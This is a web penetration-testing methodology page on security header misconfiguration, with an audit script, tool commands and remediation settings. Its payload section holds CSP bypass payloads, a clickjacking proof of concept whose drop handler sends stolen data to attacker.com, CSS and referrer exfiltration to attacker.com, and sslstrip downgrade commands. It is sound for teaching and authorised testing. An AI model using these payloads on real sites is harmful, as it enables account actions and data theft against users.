---
title: "Security Headers Misconfiguration"
date: 2026-02-24
draft: false
---

# Security Headers Misconfiguration

> **Severity**: Low–High (context dependent) | **CWE**: CWE-693, CWE-1021
> **OWASP**: A05:2021 – Security Misconfiguration

---

## What Are Security Headers?

HTTP security headers are directives sent by the server that instruct the browser how to handle the response, what resources to trust, and what features to allow. Missing or misconfigured security headers don't typically provide direct exploitation — they remove browser-enforced mitigations, which means other vulnerabilities (XSS, clickjacking, MIME sniffing) become more exploitable.

The value of auditing security headers lies in identifying the **reduced defense posture** — a missing CSP doesn't mean XSS exists, but it means if XSS exists, exploitation is trivially easy.

---

## Discovery Checklist

**Phase 1 — Collect Headers from All Surfaces**
- [ ] Main application domain (HTTPS)
- [ ] API subdomain (`api.target.com`)
- [ ] CDN-served static assets — may have different headers
- [ ] Login, registration, and payment pages specifically
- [ ] HTTP → HTTPS redirect response headers
- [ ] Error pages (404, 500) — often lack security headers

**Phase 2 — Analyze Each Header**
- [ ] CSP: present? Strict or permissive? Allows `unsafe-inline`, `unsafe-eval`, wildcards?
- [ ] HSTS: present? `max-age` sufficient? `includeSubDomains`? Preloaded?
- [ ] X-Frame-Options or CSP `frame-ancestors`: prevents clickjacking?
- [ ] X-Content-Type-Options: `nosniff` present?
- [ ] Permissions-Policy: are dangerous features restricted?
- [ ] Referrer-Policy: does it leak sensitive URL parameters to third parties?
- [ ] CORS: `Access-Control-Allow-Origin: *`? Reflects origin? Allows credentials?

**Phase 3 — Exploit Weak Headers**
- [ ] Missing/weak CSP → XSS execution easier
- [ ] Missing X-Frame-Options → clickjacking possible
- [ ] Missing HSTS → downgrade attack possible (on non-preloaded domains)
- [ ] Permissive CORS + sensitive API → cross-origin data theft
- [ ] Missing X-Content-Type-Options → MIME sniffing attacks

---

## Payload Library

### Payload 1 — Automated Header Audit

```python
#!/usr/bin/env python3
"""
Comprehensive security header audit
"""
import requests, json
from urllib.parse import urlparse

TARGET = "https://target.com"

REQUIRED_HEADERS = {
    "Strict-Transport-Security": {
        "required": True,
        "min_max_age": 15552000,  # 180 days
        "check_includeSubDomains": True,
        "check_preload": False,
    },
    "Content-Security-Policy": {
        "required": True,
        "dangerous_directives": ["unsafe-inline", "unsafe-eval", "unsafe-hashes"],
        "dangerous_sources": ["*", "http:"],
    },
    "X-Frame-Options": {
        "required": True,
        "valid_values": ["DENY", "SAMEORIGIN"],
    },
    "X-Content-Type-Options": {
        "required": True,
        "expected": "nosniff",
    },
    "Referrer-Policy": {
        "required": True,
        "preferred": ["no-referrer", "strict-origin", "strict-origin-when-cross-origin"],
    },
    "Permissions-Policy": {
        "required": False,  # recommended but not universal yet
    },
    "Cross-Origin-Embedder-Policy": {"required": False},
    "Cross-Origin-Opener-Policy": {"required": False},
    "Cross-Origin-Resource-Policy": {"required": False},
}

DEPRECATED_HEADERS = [
    "X-XSS-Protection",   # deprecated, can cause issues
    "Public-Key-Pins",    # deprecated
    "Expect-CT",          # deprecated
]

INFO_LEAKING_HEADERS = [
    "Server", "X-Powered-By", "X-AspNet-Version", "X-AspNetMvc-Version",
    "X-Generator", "X-Backend-Server", "Via", "X-Forwarded-For",
]

def analyze_csp(csp_value):
    issues = []
    csp_value_lower = csp_value.lower()
    if "unsafe-inline" in csp_value_lower:
        issues.append("UNSAFE-INLINE allows inline scripts → XSS")
    if "unsafe-eval" in csp_value_lower:
        issues.append("UNSAFE-EVAL allows eval() → XSS")
    if " * " in f" {csp_value} " or csp_value_lower.endswith(" *"):
        issues.append("Wildcard (*) source allows any domain")
    if "http:" in csp_value_lower:
        issues.append("http: source allows insecure origins")
    if "data:" in csp_value_lower:
        issues.append("data: URI source can be abused for XSS")
    if "default-src" not in csp_value_lower and "script-src" not in csp_value_lower:
        issues.append("No script-src or default-src — scripts unrestricted")
    if "nonce-" not in csp_value_lower and "sha256-" not in csp_value_lower and "unsafe-inline" not in csp_value_lower:
        pass  # no inline scripts — good
    if "object-src" not in csp_value_lower and "default-src" not in csp_value_lower:
        issues.append("No object-src — Flash/plugins unrestricted")
    return issues

def analyze_hsts(hsts_value):
    issues = []
    import re
    max_age_match = re.search(r'max-age=(\d+)', hsts_value)
    if max_age_match:
        max_age = int(max_age_match.group(1))
        if max_age < 15552000:
            issues.append(f"max-age={max_age} is below recommended 180 days (15552000)")
        if max_age < 31536000:
            issues.append(f"max-age={max_age} — browsers require 1 year for preload")
    else:
        issues.append("No max-age directive")
    if "includesubdomains" not in hsts_value.lower():
        issues.append("Missing includeSubDomains — subdomains can be attacked via HTTP")
    if "preload" not in hsts_value.lower():
        issues.append("Not preload-eligible — HSTS only effective after first visit")
    return issues

urls_to_test = [
    TARGET,
    TARGET + "/login",
    TARGET + "/api/v1/users",
]

for url in urls_to_test:
    print(f"\n{'='*60}")
    print(f"Auditing: {url}")
    print('='*60)

    try:
        r = requests.get(url, timeout=10, verify=True, allow_redirects=True)
        headers = {k.lower(): v for k, v in r.headers.items()}
    except Exception as e:
        print(f"Error: {e}")
        continue

    # Check required headers:
    for header_name, config in REQUIRED_HEADERS.items():
        header_lower = header_name.lower()
        if header_lower in headers:
            val = headers[header_lower]
            print(f"\n[+] {header_name}: {val[:120]}")
            if header_name == "Content-Security-Policy":
                for issue in analyze_csp(val):
                    print(f"    [!] {issue}")
            elif header_name == "Strict-Transport-Security":
                for issue in analyze_hsts(val):
                    print(f"    [!] {issue}")
            elif header_name == "X-Frame-Options":
                if val.upper() not in ["DENY", "SAMEORIGIN"]:
                    print(f"    [!] Non-standard value: {val}")
            elif header_name == "X-Content-Type-Options":
                if val.lower() != "nosniff":
                    print(f"    [!] Expected 'nosniff', got '{val}'")
        elif config.get("required"):
            print(f"\n[!!!] MISSING: {header_name}")

    # Info-leaking headers:
    print("\n[*] Information-leaking headers:")
    for h in INFO_LEAKING_HEADERS:
        if h.lower() in headers:
            print(f"  [LEAK] {h}: {headers[h.lower()]}")
```

### Payload 2 — CSP Bypass Techniques

```javascript
// CSP bypass techniques by policy configuration:

// === Bypass 1: unsafe-inline allowed ===
// CSP: script-src 'self' 'unsafe-inline'
// Directly inject: <script>alert(1)</script>

// === Bypass 2: JSONP endpoint on whitelisted domain ===
// CSP: script-src https://trusted.com
// If trusted.com has JSONP: https://trusted.com/api?callback=alert(1)
<script src="https://trusted.com/api?callback=alert(1)"></script>

// === Bypass 3: Angular CDN on whitelist ===
// CSP: script-src https://ajax.googleapis.com
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.0.1/angular.min.js"></script>
<div ng-app>{{constructor.constructor('alert(1)')()}}</div>

// === Bypass 4: data: URI allowed for script ===
// CSP: script-src 'unsafe-inline' data:
<script src="data:text/javascript,alert(1)"></script>

// === Bypass 5: Strict-Dynamic with nonce — script injection ===
// CSP: script-src 'nonce-RANDOM' 'strict-dynamic'
// If nonce-based CSP and nonce is predictable or reflected:
<script nonce="PREDICTED_NONCE">alert(1)</script>

// === Bypass 6: base-uri not set — base tag injection ===
// CSP: script-src 'self' — but no base-uri directive
// Inject: <base href="https://evil.com/"> → all relative scripts load from evil.com
<base href="https://attacker.com/">

// === Bypass 7: style-src 'unsafe-inline' + CSS injection ===
// No XSS but can leak data via CSS attribute selectors:
// Only leaks one character at a time (timing attack):
input[value^="a"] { background: url(https://attacker.com/a) }
input[value^="b"] { background: url(https://attacker.com/b) }
// Continued for each character position

// === Bypass 8: script-src wildcard on CDN ===
// CSP: script-src *.cloudfront.net
// If you can upload to cloudfront.net (e.g., own S3 bucket + CloudFront):
<script src="https://YOUR_DISTRIB.cloudfront.net/evil.js"></script>

// === Bypass 9: iframe sandbox bypass ===
// CSP: frame-ancestors 'self' — but no sandbox on iframe
// If you can load iframe, load your JS inside it:
// (Depends on specific CSP configuration)

// Test CSP headers for bypass opportunities:
// CSP Evaluator: https://csp-evaluator.withgoogle.com/
// CSP Scanner Burp extension

// Enumerate JSONP endpoints on whitelisted domains:
// Common JSONP endpoints:
const jsonpTargets = [
    "https://accounts.google.com/o/oauth2/revoke?token=null&callback=alert(1)",
    "https://open.spotify.com/oembed?url=https://open.spotify.com/track/x&callback=alert",
    "https://api.twitter.com/1/statuses/oembed.json?url=x&callback=alert",
    // Find with: site:trusted.com callback OR jsonp inurl:callback
];
```

### Payload 3 — Clickjacking via Missing Frame Protection

```html
<!DOCTYPE html>
<html>
<head><title>Clickjacking PoC</title></head>
<body>
<!--
  Target: missing X-Frame-Options and no CSP frame-ancestors
  Attack: iframe the target page over a button that triggers state-changing action
-->
<style>
  #victim-frame {
    position: absolute;
    top: 0; left: 0;
    width: 100%; height: 100%;
    opacity: 0.0001;  /* nearly transparent — victim sees attacker UI */
    z-index: 2;
  }
  #bait-button {
    position: absolute;
    top: 300px; left: 200px;  /* align with target's "Delete Account" button */
    z-index: 1;
    font-size: 24px;
    padding: 15px 30px;
    background: #4CAF50;
    color: white;
    border: none;
    cursor: pointer;
  }
</style>

<button id="bait-button">Click to Win $1000!</button>

<iframe id="victim-frame"
  src="https://target.com/account/settings#delete-account"
  sandbox="allow-scripts allow-forms allow-same-origin"
  scrolling="no">
</iframe>

<!-- Alternative: cursorjacking — move cursor to trick user -->
<!-- dragdrop: if target allows, drag sensitive content to attacker's div -->

<script>
// Confirm framing worked (same-origin restriction):
try {
    var frame = document.getElementById('victim-frame');
    frame.onload = function() {
        // Can only read cross-origin if CORS allows:
        console.log('[*] Frame loaded');
    };
} catch(e) {
    console.log('[*] Cross-origin — cannot read content');
}

// Drag-and-drop clickjacking:
// If target has draggable elements with sensitive data:
document.addEventListener('dragover', function(e) {
    e.preventDefault();
    e.dataTransfer.dropEffect = 'copy';
});
document.addEventListener('drop', function(e) {
    e.preventDefault();
    var data = e.dataTransfer.getData('Text');
    fetch('https://attacker.com/steal?d=' + encodeURIComponent(data));
});
</script>
</body>
</html>
```

### Payload 4 — HSTS Downgrade Attack (Missing HSTS)

```bash
# If HSTS is missing or max-age is too short:
# On a network MITM position, can downgrade HTTPS to HTTP

# Test HSTS presence:
curl -si "https://target.com/" | grep -i "strict-transport"

# Check if site is HSTS preloaded:
curl -s "https://hstspreload.org/api/v2/status?domain=target.com" | python3 -m json.tool

# If NOT preloaded AND max-age < 1 year:
# SSLstrip2 attack (requires network MITM position — e.g., same WiFi):
# sslstrip strips HTTPS redirects before HSTS can be set
python3 sslstrip.py -l 10000 -s

# Test HTTP to HTTPS redirect with security headers:
curl -si "http://target.com/" | grep -iE "location|strict-transport|set-cookie"
# → If redirect doesn't set Secure cookie → session cookie leaked over HTTP

# Cookie without Secure flag over HSTS:
# Even with HSTS, if cookie lacks Secure flag:
# → HSTS only prevents cleartext connection, but cookie can be sent on first
#    HTTP request before HSTS kicks in (for non-preloaded sites)
curl -si "https://target.com/login" | grep -i "set-cookie" | grep -iv "secure"
```

### Payload 5 — Referrer Leakage Testing

```bash
# Check Referrer-Policy:
curl -si "https://target.com/" | grep -i "referrer-policy"

# If missing or set to "unsafe-url" / "origin-when-cross-origin":
# Sensitive URL parameters in Referer header leak to third-party resources on page

# Test: does target page include third-party resources (analytics, fonts, ads)?
curl -s "https://target.com/reset?token=SENSITIVE_TOKEN" | \
  grep -E 'src=|href=|action=' | grep -v "target.com" | head -20
# If page has third-party resources → Referer header sent with reset token → token leaked

# Referrer leakage via redirect:
# Page at https://target.com/private?data=SENSITIVE → links to https://external.com
# If Referrer-Policy not set: Referer: https://target.com/private?data=SENSITIVE
# → data visible to external.com

# Test: OAuth state token in Referer:
# During OAuth flow: redirect from target.com to provider
# If target.com doesn't set Referrer-Policy before redirect:
# → Authorization code or state token visible to any analytics script on target.com

# Test Referrer via fetch/image:
# (From a page that links to external resource)
# Create a page on attacker.com:
cat << 'EOF' > /tmp/test.html
<html>
<head>
<meta name="referrer" content="unsafe-url">
</head>
<body>
<img src="https://attacker.com/log?ref=PLACEHOLDER"
     onload="this.src='https://attacker.com/log?ref='+document.referrer">
</body>
</html>
EOF
```

### Payload 6 — Permissions-Policy Abuse

```bash
# Check Permissions-Policy (Feature-Policy) header:
curl -si "https://target.com/" | grep -iE "permissions-policy|feature-policy"

# Missing Permissions-Policy → browser features enabled by default:
# Features that should be restricted in most apps:
# - geolocation: location tracking
# - microphone, camera: media capture
# - payment: Payment Request API
# - usb, bluetooth: hardware access
# - sync-xhr: deprecated synchronous XHR
# - accelerometer, gyroscope: device sensors
# - display-capture: screen sharing

# XSS + missing camera restriction → camera access without prompt override:
# (Still requires user to have previously granted to origin)
# Restrictions help by preventing legitimate pages from being used as pivot

# Test which features are available via JS (browser DevTools or from XSS):
document.featurePolicy.allowedFeatures()
document.permissionsPolicy.allowedFeatures()

# Check if framed content can access sensitive APIs:
# If page allows iframes without sandbox and no Permissions-Policy:
# Attacker iframe can use features granted to the origin
```

---

## Tools

```bash
# Mozilla Observatory — comprehensive header scan:
curl -s "https://http.observatory.mozilla.org/api/v1/analyze?host=target.com" | \
  python3 -m json.tool | grep -E '"score"|"grade"|"pass"'

# securityheaders.com scan (via CLI):
curl -si "https://securityheaders.com/?q=target.com&hide=on&followRedirects=on" | \
  grep -i "grade\|missing\|present"

# nuclei — header misconfiguration templates:
nuclei -target https://target.com \
  -t misconfiguration/clickjacking.yaml \
  -t misconfiguration/cors-misconfig.yaml \
  -t misconfiguration/http-missing-security-headers.yaml \
  -t misconfiguration/hsts-missing.yaml

# testssl.sh — SSL/TLS + header analysis:
testssl.sh --headers https://target.com

# nikto — basic security header check:
nikto -h https://target.com

# Manual curl header audit:
curl -si "https://target.com/" | python3 << 'EOF'
import sys

lines = sys.stdin.read().split('\n')
headers = {}
for line in lines:
    if ':' in line and not line.startswith('HTTP/'):
        k, _, v = line.partition(':')
        headers[k.strip().lower()] = v.strip()

checks = {
    'strict-transport-security': 'HSTS',
    'content-security-policy': 'CSP',
    'x-frame-options': 'Clickjacking protection',
    'x-content-type-options': 'MIME sniffing protection',
    'referrer-policy': 'Referrer control',
    'permissions-policy': 'Feature policy',
}

for h, name in checks.items():
    if h in headers:
        print(f'[+] {name}: {headers[h][:80]}')
    else:
        print(f'[-] MISSING: {name} ({h})')

info_leak = ['server', 'x-powered-by', 'x-aspnet-version', 'x-generator']
for h in info_leak:
    if h in headers:
        print(f'[!] INFO LEAK: {h}: {headers[h]}')
EOF

# CSP Evaluator (Google):
# https://csp-evaluator.withgoogle.com/
# Or via API:
curl -s -X POST "https://csp-evaluator.withgoogle.com/getCSPEvaluation" \
  -H "Content-Type: application/json" \
  -d '{"csp":"YOUR_CSP_HEADER_VALUE","version":3}' | python3 -m json.tool
```

---

## Remediation Reference

**Content-Security-Policy** — strict recommended configuration:
```
Content-Security-Policy: default-src 'none'; script-src 'nonce-{RANDOM}' 'strict-dynamic'; style-src 'self' 'nonce-{RANDOM}'; img-src 'self' data:; font-src 'self'; connect-src 'self'; frame-ancestors 'none'; base-uri 'none'; form-action 'self'; object-src 'none'; upgrade-insecure-requests;
```
- Use nonces for inline scripts; avoid `unsafe-inline` and `unsafe-eval`; set `strict-dynamic` to allow script-created scripts

**Strict-Transport-Security**:
```
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
```
- Minimum max-age of 1 year (31536000); include `preload` and submit to hstspreload.org

**X-Frame-Options** (or CSP frame-ancestors):
```
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none';
```
- `frame-ancestors` in CSP supersedes `X-Frame-Options`; use both for compatibility

**X-Content-Type-Options**:
```
X-Content-Type-Options: nosniff
```

**Referrer-Policy**:
```
Referrer-Policy: strict-origin-when-cross-origin
```
- Or `no-referrer` if no cross-origin referrer needed; avoid `unsafe-url`

**Permissions-Policy**:
```
Permissions-Policy: geolocation=(), microphone=(), camera=(), payment=(), usb=()
```
- Restrict all features not used by the application

*Part of the Web Application Penetration Testing Methodology series.*
